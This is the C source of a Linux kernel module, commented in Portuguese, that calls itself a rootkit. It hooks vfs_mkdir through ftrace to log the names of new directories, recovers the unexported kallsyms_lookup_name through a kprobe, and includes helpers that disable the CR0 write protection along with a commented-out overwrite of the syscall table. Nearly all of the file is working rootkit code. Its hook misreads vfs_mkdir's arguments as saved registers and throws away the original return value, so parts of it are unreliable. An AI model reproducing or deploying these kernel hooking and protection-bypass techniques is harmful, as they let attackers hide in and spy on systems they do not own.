#include <asm-generic/errno-base.h>
#include <linux/init.h>
#include <linux/limits.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/ftrace.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Breno Nascimento");
MODULE_DESCRIPTION("mkdir syscall hook");
MODULE_VERSION("0.01");

struct ftrace_hook {
    const char* name;
    void* function;
    void* original;

    unsigned long address;
    struct ftrace_ops ops;
};
static struct ftrace_hook hook;

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs);
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}

static unsigned long * __sys_call_table; // endereco da nossa tabela de syscall

// static asmlinkage long (*orig_mkdir)(const struct pt_regs *);

// asmlinkage int hook_mkdir(const struct pt_regs *regs)
// {
//     char __user *pathname = (char *)regs->di;
//     char dir_name[NAME_MAX] = {0};
//
//     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
//
//     if (error > 0)
//         printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
//
//     orig_mkdir(regs);
//     return 0;
// }

// precisamos redeclarar a syscall original da forma que e' definida no kernel pra poder reusar ela posteriormente
// antigamente, os argumentos eram passados pra syscall do jeito que aparenta ser (pela definicao do kernel).
// porem, desde o kernel 4.17.0, isso mudou pra que os registradores fossem copiados pra uma struct pt_regs e ai sim
// serem passados como unico argumento pra syscall
// em ptrace.h, a struct e' definido de forma que cada registrador tem seu nome comum, sem o prefixo (rsi -> si)
asmlinkage long (*orig_mkdir)(const struct pt_regs *);
asmlinkage int hook_mkdir(const struct pt_regs *regs);

asmlinkage int hook_mkdir(const struct pt_regs *regs) {
    char __user *pathname = (char *) regs->di;
    char dir_name[NAME_MAX] = {0};

    long error  = strncpy_from_user(dir_name, pathname, NAME_MAX);
    if (error) printk(KERN_INFO "rootkit: Tentando criar um diretorio com nome %s\n", dir_name);

    orig_mkdir(regs);
    return 0;
}
// kallsyms_lookup_name(): dado o simbolo de uma funcao do kernel, retorna o endereco de memoria dessa
// funcao (em espaco de kernel)

/* desde a versao 5.7 do kernel, kallsyms_lookup_name() foi des-exportado pois havia gente abusando
 * dessa funcao pra chamar funcoes que sao licenciadas por GPL sem que o modulo delas seja necessariamente
 * licenciado tambem por GPL. Improvisamos nisso usando kprobes pra pegar o endereco da funcao e trazer
 * de volta pro nosso modulo*/
unsigned long* buscar_kallsyms_lookup_name(void); // cc quer que tenha esse prototipo antes da definicao de fato

unsigned long* buscar_kallsyms_lookup_name(void) {
    struct kprobe kp;
    unsigned long* addr;

    memset(&kp, 0, sizeof(struct kprobe));
    kp.symbol_name = "kallsyms_lookup_name";

    if (register_kprobe(&kp) < 0) {
        return 0;
    }
    addr = (unsigned long*)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

inline void cr0_write(unsigned long cr0) {
    asm volatile("mov %0,%%cr0" : : "r"(cr0) : "memory");
}

static inline void desproteger_memoria(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);

    cr0_write(cr0);
}

static inline void proteger_memoria(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);

    cr0_write(cr0);
}

static int __init rootkit_init(void) {
    // unsigned long addr;
    // addr = kallsyms_lookup_name("vfs_mkdir");
    unsigned long* (*kln)(const char*) = (unsigned long*(*)(const char*))buscar_kallsyms_lookup_name();
    if (!kln) {
        printk(KERN_ERR "rootkit: ERR: nao foi possivel pegar o endereco de 'kallsyms_lookup_name()'\n");
        return -ENOENT;
    }
    printk(KERN_INFO "rootkit: carregado no sistema >:D\n");
    // addr = kallsyms_lookup_name("vfs_mkdir");
    // chamar nossa versao
    // addr = kln("vfs_mkdir");
    // if (!addr) {
    //     printk(KERN_ERR "rootkit: simbolo nao resolvido\n");
    //     return -ENOENT;
    // }
    // printk(KERN_INFO "Endereco de vfs_mkdir: %lx", addr);

    // __sys_call_table = kln("sys_call_table");
    // if (!__sys_call_table) {
    //     printk(KERN_ERR "rootkit: tabela de syscalls nao encontrada!!\n");
    //     return -ENOENT;
    // }
    // EU ODEIO TYPE CAST
    // printk(KERN_INFO "rootkit: tabela de syscall encontrada em 0x%lx\n", (unsigned long)__sys_call_table);
    // orig_mkdir = (long int (*)(const struct pt_regs*))__sys_call_table[__NR_mkdir];
    // printk(KERN_INFO "rootkit: mkdir original encontrado em 0x%lx\n", (unsigned long)orig_mkdir);

    orig_mkdir = (long int (*)(const struct pt_regs*))kln("vfs_mkdir");
    // hook = {.name = "vfs_mkdir", .function = (void*)hook_mkdir, .original = &orig_mkdir};
    hook.name = "vfs_mkdir";
    hook.function = (void*)hook_mkdir;
    hook.original = &orig_mkdir;
    hook.ops.func = fh_ftrace_thunk;
    hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    int err;
    err = ftrace_set_filter(&hook.ops, "vfs_mkdir", strlen("vfs_mkdir"), 0);
    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
    if (err) {
        printk(KERN_ERR "rootkit: ftrace_set_filter() falhou; err = %d\n", err);
        return err;
    }
    err = register_ftrace_function(&hook.ops);
    if (err) {
        printk(KERN_ERR "rootkit: register_ftrace_function() falhou; err = %d\n", err);
        return err;
    }

    // desproteger_memoria();

    // printk(KERN_INFO "rootkit: fazendo hook de mkdir; syscall de valor %d\n", __NR_mkdir);
    // __sys_call_table[__NR_mkdir] = (unsigned long)hook_mkdir;

    // proteger_memoria();

    return 0;
}

static void __exit rootkit_exit(void) {
    // desproteger_memoria();
    
    // printk(KERN_INFO "rootkit: restaurando syscall mkdir\n");
    // __sys_call_table[__NR_mkdir] = (unsigned long)orig_mkdir;

    // proteger_memoria();

    int err;
    err = unregister_ftrace_function(&hook.ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 1, 0);
    // if(err)
    // {
    //     printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    // }
    printk(KERN_INFO "rootkit: descarregado D:\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
